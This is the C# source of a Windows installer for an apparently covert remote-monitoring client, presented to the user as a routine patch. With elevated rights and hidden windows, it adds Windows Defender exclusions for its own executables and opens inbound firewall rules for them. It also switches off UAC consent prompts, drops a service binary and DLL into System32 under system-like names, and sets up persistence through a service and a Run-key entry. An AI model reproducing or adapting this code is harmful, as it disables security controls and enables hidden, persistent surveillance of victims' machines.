using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CMonAutoSetup
{
   
    class Program
    {
        [DllImport("coredll.dll", SetLastError = true)]
        public static extern int MessageBoxW(int hWnd, String text, String caption, uint type);
        private static void CloseProcess(Process[] processes)
        {
            for (int i = 0; i < processes.Length; i++)
            {
                try
                {
                    processes[i].Kill();
                }
                catch
                {

                }
            }
        }

        private static void KillOldService()
        {
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory)+@"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                string stopcmd = "/c sc stop CMonSvc";
                startInfo.Arguments = stopcmd;
                startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();

                Thread.Sleep(2000);
                process = new System.Diagnostics.Process();
                startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory)+@"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.FileName = "cmd.exe";
                stopcmd = "/c sc delete CMonSvc";
                startInfo.Arguments = stopcmd;
                startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();

            }
            catch
            {

            }
        }

        public static void KillNewService()
        {
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory)+@"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                string stopcmd = "/c taskkill /IM CSVHost.exe /F & taskkill /IM CSVAuto.exe /F";
                startInfo.Arguments = stopcmd;
                //startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }

            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory)+@"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                string stopcmd = "/c taskkill /IM CSVHost.exe /F & taskkill /IM CSVAuto.exe /F";
                startInfo.Arguments = stopcmd;
                //startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {
                
            }

            //try
            //{
            //    var processes = FindProcess("CSVHost.exe");
            //    CloseProcess(processes);
            //}
            //catch { }

            //try
            //{
            //    var processes = FindProcess("CSVAuto.exe");
            //    CloseProcess(processes);
            //}
            //catch { }

            try
            {
                var processes = FindProcess("CSVHostController");
                CloseProcess(processes);
            }
            catch { }
        }
        public static void KillNewestService()
        {
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                string stopcmd = "/c taskkill /IM CRMHost.exe /F & taskkill /IM CRMAuto.exe /F";
                startInfo.Arguments = stopcmd;
                //startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }

            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                string stopcmd = "/c taskkill /IM CRMHost.exe /F & taskkill /IM CRMAuto.exe /F";
                startInfo.Arguments = stopcmd;
                //startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
            }
            catch
            {

            }

            //try
            //{
            //    var processes = FindProcess("CSVHost.exe");
            //    CloseProcess(processes);
            //}
            //catch { }

            //try
            //{
            //    var processes = FindProcess("CSVAuto.exe");
            //    CloseProcess(processes);
            //}
            //catch { }

            try
            {
                var processes = FindProcess("CRMHostController");
                CloseProcess(processes);
            }
            catch { }
        }
        private static Process[] FindProcess(string processName)
        {
            Process[] processList = Process.GetProcessesByName(processName);

            return processList;
        }

        static string strVersion = "2.57";
        static void Main(string[] args)
        {
            //MessageBox.Show(" The Monitor.TaskView is now patching.\n In order to install the Monitor.TaskViewer successfully, You have to click 'Yes' on the next dialog box.  ", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);

            //delete service if it exists
            Console.WriteLine("Creating Date : 10/25/2021");
            Console.WriteLine("Monitoring project version " + strVersion);
            Console.WriteLine("Copyright Ryonbong. All right reserved.");
            Thread.Sleep(500);
            Console.WriteLine("");
            Console.WriteLine("Now installing the Client.exe...");
            Console.WriteLine("Don't close this cmd window until this setup is completed successfully.");
            Thread.Sleep(2000);
            
            try
            {
                var process = new System.Diagnostics.Process();
                var startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                startInfo.UseShellExecute = true;
                startInfo.CreateNoWindow = true;
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";

                string command = "/c netsh advfirewall set privateprofile state on & netsh advfirewall set publicprofile state on";
                command += " & PowerShell Remove-MpPreference -ExclusionPath " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Client";
                command += " & PowerShell Remove-MpPreference -ExclusionPath " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Server";
                //command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Client\\CSVAuto.exe";
                command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Client\\CSVHost.exe";
                command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Client\\Monitor.TaskView.exe";
                //command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Server\\SSVAuto.exe";
                command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Server\\SSVHost.exe ";
                command += " & PowerShell Remove-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\Server\\Monitor.TaskControl.exe ";
                command += " & PowerShell Add-MpPreference -ExclusionPath " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client";
                command += " & PowerShell Add-MpPreference -ExclusionPath " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server";
                //command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\CRMAuto.exe";
                command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\CRMHost.exe";
                command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\Monitor.TaskView.exe";
                //command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\SRMAuto.exe";
                command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\SRMHost.exe";
                command += " & PowerShell Add-MpPreference -ExclusionProcess " + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\Monitor.TaskControl.exe ";               

                command += " & netsh advfirewall firewall delete rule name=\"CSVHost\"";
                //command += " & netsh advfirewall firewall delete rule name=\"CSVAuto\"";
                command += " & netsh advfirewall firewall delete rule name=\"CRMHost\"";
                //command += " & netsh advfirewall firewall delete rule name=\"CRMAuto\"";
                command += " & netsh advfirewall firewall delete rule name=\"MonitorView\"";
                command += " & netsh advfirewall firewall add rule name=\"CRMHost\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\CRMHost.exe\" enable=yes profile=any ";
                //command += " & netsh advfirewall firewall add rule name=\"CRMAuto\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\CRMAuto.exe\" enable=yes profile=any ";
                command += " & netsh advfirewall firewall add rule name=\"MonitorView\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\Monitor.TaskView.exe\" enable=yes profile=any";
                command += " & netsh advfirewall firewall delete rule name=\"SSVHost\"";
                //command += " & netsh advfirewall firewall delete rule name=\"SSVAuto\"";
                command += " & netsh advfirewall firewall delete rule name=\"SRMHost\"";
                //command += " & netsh advfirewall firewall delete rule name=\"SRMAuto\"";
                command += " & netsh advfirewall firewall delete rule name=\"MonitorControl\"";
                command += " & netsh advfirewall firewall delete rule name=\"Monitor.TaskControl\"";
                command += " & netsh advfirewall firewall add rule name=\"SRMHost\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\SRMHost.exe\" enable=yes profile=any ";
                //command += " & netsh advfirewall firewall add rule name=\"SRMAuto\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\SRMAuto.exe\" enable=yes profile=any ";
                command += " & netsh advfirewall firewall add rule name=\"MonitorControl\" dir=in action=allow program=\"" + Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Server\\Monitor.TaskControl.exe\" enable=yes profile=any";
                command += " & PowerShell Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0";

                startInfo.Arguments = command;
                startInfo.Verb = "runas";
                process.StartInfo = startInfo;
                process.Start();

                process.WaitForExit();
            }
            catch
            {
                //MessageBox.Show(" You have to click 'Yes' to patch the TaskViewer successfully", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Process.Start(FileName);
                Environment.Exit(0);
                return;
            }
                        
            //KillOldService();
            //Thread.Sleep(2000);
            //KillOldService();

            KillNewService();
            KillNewestService();
            try
            {
                var processes = FindProcess("Monitor.TaskView");
                CloseProcess(processes);
            }
            catch { }
            try
            {
                ServiceController sc = new ServiceController("SystemServiceClient");
                switch (sc.Status)
                {
                    case ServiceControllerStatus.Running:
                        try
                        {
                            var process = new System.Diagnostics.Process();
                            var startInfo = new System.Diagnostics.ProcessStartInfo();
                            startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                            startInfo.UseShellExecute = true;
                            startInfo.CreateNoWindow = true;
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            startInfo.FileName = "cmd.exe";

                            string command = $"/c PowerShell Stop-Service -Name \"SystemServiceClient\"";
                            startInfo.Arguments = command;
                            startInfo.Verb = "runas";
                            process.StartInfo = startInfo;
                            process.Start();

                            process.WaitForExit();
                        }
                        catch
                        {
                        }
                        break;
                    default:
                        break;
                }
            }
            catch
            {

            }
            Thread.Sleep(3000);
            //delete all old files
            Console.WriteLine("");
            Console.WriteLine("checking old files....");
            Console.WriteLine("It may take a while for checking to respond.");
            Console.WriteLine("Please know that I will get to your case as soon as possible.");
            Thread.Sleep(2000);
            //try
            //{
            //    if (File.Exists(Path.Combine(oldpath, "Monitor.TaskView.exe")))
            //    {
            //        File.Delete(Path.Combine(oldpath, "Monitor.TaskView.exe"));
            //    }
            //}
            //catch
            //{

            //}
            //try
            //{
            //    if (File.Exists(Path.Combine(oldpath, "CSVHostController.exe")))
            //    {
            //        File.Delete(Path.Combine(oldpath, "CSVHostController.exe"));
            //    }
            //}
            //catch (Exception ex)
            //{
            //    //File.AppendAllText("log.txt", ex.Message);
            //}
            //try
            //{
            //    if (Directory.Exists(oldpath))
            //    {
            //        Directory.Delete(oldpath, true);
            //    }
            //}
            //catch
            //{

            //}
            
            Console.WriteLine("");
            Console.WriteLine("suspending the process...");
            Console.WriteLine("This is small job so the processing will not be very much.");
            Console.WriteLine("Please know that I will get to your case as soon as possible.");
            Thread.Sleep(2000);

            string path = Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\RM\\Client\\";
            string newpath = Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RBM\\Client\\";
            //delete new all files
            try
            {
                try
                {
                    if (File.Exists(Path.Combine(path, "Monitor.TaskView.exe")))
                    {
                        File.Delete(Path.Combine(path, "Monitor.TaskView.exe"));
                    }
                }
                catch
                {

                }
                if (Directory.Exists(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\"))
                {
                    Directory.Delete(Path.GetPathRoot(Environment.SystemDirectory) + "Users\\Public\\RM\\", true);
                }

                try
                {
                    if (File.Exists(Path.Combine(newpath, "Monitor.TaskView.exe")))
                    {
                        File.Delete(Path.Combine(newpath, "Monitor.TaskView.exe"));
                    }
                }
                catch
                {

                }
                try
                {
                    if (File.Exists(Path.Combine(Environment.SystemDirectory, "SystemServiceClient.exe")))
                    {
                        File.Delete(Path.Combine(Environment.SystemDirectory, "SystemServiceClient.exe"));
                    }
                }
                catch
                {

                }
                if (Directory.Exists(newpath))
                {
                    Directory.Delete(newpath, true);
                }
                //try
                //{
                //    if(File.Exists(Path.Combine(Environment.SystemDirectory, "SystemServiceClient.exe")))
                //    {
                //        File.Delete(Path.Combine(Environment.SystemDirectory, "SystemServiceClient.exe"));
                //    }
                //}
                //catch
                //{

                //}
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            
            Console.WriteLine("");
            Console.WriteLine("installing new process...");
            Console.WriteLine("It look like our installing is coming to end now. Thank you for your Patience.");
            Thread.Sleep(2000);
            // check directory and create.
            try
            {
                if (!Directory.Exists(newpath))
                {
                    Directory.CreateDirectory(newpath);
                }
            }
            catch
            {

            }


            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey("Software", true);
                key = key.CreateSubKey("RMClient");
                key.SetValue("Version", strVersion);
                key.Close();
            }
            catch
            {

            }

            //copy files
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CMonAutoSetup.CRMHost.exe");
                FileStream fileStream = new FileStream(Path.Combine(newpath, "CRMHost.exe"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                //File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                if (!File.Exists(Path.Combine(Environment.SystemDirectory, "SystemServiceClient.exe")))
                {
                    Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CMonAutoSetup.SystemServiceClient.exe");
                    FileStream fileStream = new FileStream(Path.Combine(Environment.SystemDirectory, "SystemServiceClient.exe"), FileMode.CreateNew);
                    for (int i = 0; i < stream.Length; i++)
                        fileStream.WriteByte((byte)stream.ReadByte());
                    fileStream.Close();

                   
                    //New-Service -Name "YourServiceName" -BinaryPathName <yourproject>.exe

                    try
                    {
                        var process = new System.Diagnostics.Process();
                        var startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                        startInfo.UseShellExecute = true;
                        startInfo.CreateNoWindow = true;
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.FileName = "cmd.exe";

                        string command = $"/c PowerShell New-Service -Name \"SystemServiceClient\" -BinaryPathName {Path.Combine(Environment.SystemDirectory, "SystemServiceClient.exe")}";
                        startInfo.Arguments = command;
                        startInfo.Verb = "runas";
                        process.StartInfo = startInfo;
                        process.Start();

                        process.WaitForExit();
                    }
                    catch
                    {
                        /// return;
                    }
                }
                if (!File.Exists(Path.Combine(Environment.SystemDirectory, "ProcessExtensions.dll")))
                {
                    Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CMonAutoSetup.ProcessExtensions.dll");
                    FileStream fileStream = new FileStream(Path.Combine(Environment.SystemDirectory, "ProcessExtensions.dll"), FileMode.CreateNew);
                    for (int i = 0; i < stream.Length; i++)
                        fileStream.WriteByte((byte)stream.ReadByte());
                    fileStream.Close();
                }
                

            }
            catch (Exception ex)
            {
                //File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CMonAutoSetup.Monitor.TaskView.exe");
                FileStream fileStream = new FileStream(Path.Combine(newpath, "Monitor.TaskView.exe"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                //File.AppendAllText("log.txt", ex.Message);
            }
            //  File.AppendAllText("log.txt", "Copied new files");
            //register for the start up running
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (rkApp.GetValue("CSVHost") != null)
            {
                rkApp.DeleteValue("CSVHost");

            }

            if (rkApp.GetValue("CRMHost") != null)
            {
                rkApp.DeleteValue("CRMHost");

            }
            rkApp.SetValue("CRMHost", Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\RBM\\Client\\CRMHost.exe");

            if (rkApp.GetValue("CSVAuto") != null)
            {
                rkApp.DeleteValue("CSVAuto");

            }

            if (rkApp.GetValue("CRMAuto") != null)
            {
                rkApp.DeleteValue("CRMAuto");

            }
            // rkApp.SetValue("CRMAuto", Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\RBM\\Client\\CRMAuto.exe");
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CMonAutoSetup.CSCore.dll");
                FileStream fileStream = new FileStream(Path.Combine(newpath, "CSCore.dll"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            //try
            //{
            //    Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CMonAutoSetup.CSAudioRecorder.dll");
            //    FileStream fileStream = new FileStream(Path.Combine(path, "CSAudioRecorder.dll"), FileMode.CreateNew);
            //    for (int i = 0; i < stream.Length; i++)
            //        fileStream.WriteByte((byte)stream.ReadByte());
            //    fileStream.Close();
            //}
            //catch (Exception ex)
            //{
            //    // File.AppendAllText("log.txt", ex.Message);
            //}
            //try
            //{
            //    Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CMonAutoSetup.DlibDotNet.dll");
            //    FileStream fileStream = new FileStream(Path.Combine(path, "DlibDotNet.dll"), FileMode.CreateNew);
            //    for (int i = 0; i < stream.Length; i++)
            //        fileStream.WriteByte((byte)stream.ReadByte());
            //    fileStream.Close();
            //}
            //catch (Exception ex)
            //{
            //    // File.AppendAllText("log.txt", ex.Message);
            //}
            //try
            //{
            //    Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CMonAutoSetup.DlibDotNetNative.dll");
            //    FileStream fileStream = new FileStream(Path.Combine(path, "DlibDotNetNative.dll"), FileMode.CreateNew);
            //    for (int i = 0; i < stream.Length; i++)
            //        fileStream.WriteByte((byte)stream.ReadByte());
            //    fileStream.Close();
            //}
            //catch (Exception ex)
            //{
            //    // File.AppendAllText("log.txt", ex.Message);
            //}
            //try
            //{
            //    Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CMonAutoSetup.DlibDotNetNativeDnn.dll");
            //    FileStream fileStream = new FileStream(Path.Combine(path, "DlibDotNetNativeDnn.dll"), FileMode.CreateNew);
            //    for (int i = 0; i < stream.Length; i++)
            //        fileStream.WriteByte((byte)stream.ReadByte());
            //    fileStream.Close();
            //}
            //catch (Exception ex)
            //{
            //    // File.AppendAllText("log.txt", ex.Message);
            //}

            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CMonAutoSetup.LiveCharts.dll");
                FileStream fileStream = new FileStream(Path.Combine(newpath, "LiveCharts.dll"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }
            try
            {
                Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("CMonAutoSetup.LiveCharts.Wpf.dll");
                FileStream fileStream = new FileStream(Path.Combine(newpath, "LiveCharts.Wpf.dll"), FileMode.CreateNew);
                for (int i = 0; i < stream.Length; i++)
                    fileStream.WriteByte((byte)stream.ReadByte());
                fileStream.Close();
            }
            catch (Exception ex)
            {
                // File.AppendAllText("log.txt", ex.Message);
            }

            //try
            //{
            //    var proc = new Process();
            //    proc.StartInfo.FileName = Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\RBM\\Client\\CRMHost.exe";
            //    proc.StartInfo.UseShellExecute = true;
            //    proc.Start();
            //}
            //catch
            //{

            //}

            //try
            //{
            //    var proc = new Process();
            //    proc.StartInfo.FileName = Path.GetPathRoot(Environment.SystemDirectory)+"Users\\Public\\RBM\\Client\\Monitor.TaskView.exe";
            //    proc.StartInfo.UseShellExecute = true;
            //    proc.Start();
            //}
            //catch
            //{

            //}
            try
            {
                //start service if it's stopped
                ServiceController sc = new ServiceController("SystemServiceClient");
                switch (sc.Status)
                {
                    case ServiceControllerStatus.Running:
                        break;
                    case ServiceControllerStatus.Stopped:
                        try
                        {
                            var process = new System.Diagnostics.Process();
                            var startInfo = new System.Diagnostics.ProcessStartInfo();
                            startInfo.WorkingDirectory = Path.GetPathRoot(Environment.SystemDirectory) + @"Windows\System32";
                            startInfo.UseShellExecute = true;
                            startInfo.CreateNoWindow = true;
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            startInfo.FileName = "cmd.exe";

                            string command = $"/c PowerShell Start-Service -Name \"SystemServiceClient\"";
                            startInfo.Arguments = command;
                            startInfo.Verb = "runas";
                            process.StartInfo = startInfo;
                            process.Start();

                            process.WaitForExit();
                        }
                        catch
                        {
                        }
                        break;
                    case ServiceControllerStatus.Paused:
                        break;
                    case ServiceControllerStatus.StopPending:
                        break;
                    case ServiceControllerStatus.StartPending:
                        break;
                    default:
                        break;
                }
            }
            catch
            {

            }
            Console.WriteLine("Successfully installed");
            Console.WriteLine("Press anykey to exit");
        }

        public static string FileName
        {
            get { return Process.GetCurrentProcess().MainModule.FileName; }
        }
    }
}
